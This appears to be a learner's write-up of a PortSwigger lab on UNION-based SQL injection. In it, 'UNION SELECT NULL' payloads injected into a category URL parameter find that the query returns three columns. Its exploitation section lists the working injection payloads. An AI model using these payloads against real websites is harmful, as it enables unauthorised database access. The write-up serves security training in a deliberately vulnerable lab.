## Objective:
To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.
Lab Link: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-determining-the-number-of-columns-required/sql-injection/union-attacks/lab-determine-number-of-columns

## Initial Analysis
As the description states, it appears that the website categorises its products based on category, and this category is visible in the URL as shown below:
`web-security-academy.net/filter?category=Gifts`
The category parameter appears to be incorporated into a backend SQL query. Testing confirms that it is vulnerable to SQL injection.

## Exploitation
The lab specifies that the objective is to count the number of columns in the original database query. To do this, I used the `UNION SELECT` clause along with a varying number of `NULL` values.
#### First Payload
	web-security-academy.net/filter?category=Gifts' UNION SELECT NULL --
	This returned an error on the screen
#### Second Payload
	web-security-academy.net/filter?category=Gifts' UNION SELECT NULL, NULL --
	This also returned an error on the screen
#### Third Payload
	web-security-academy.net/filter?category=Gifts' UNION SELECT NULL, NULL, NULL --
	This executed successfully without generating an error.
	
## Conclusion
From the exploitation, we can concur that there are  3 columns returned by the original query; this information can be further used to execute a successful UNION Attack.

## Key Learning
UNION-based SQL injection requires the injected query to return the same number of columns as the original query. Using NULL values provides a simple way to enumerate the correct column count before attempting data extraction.
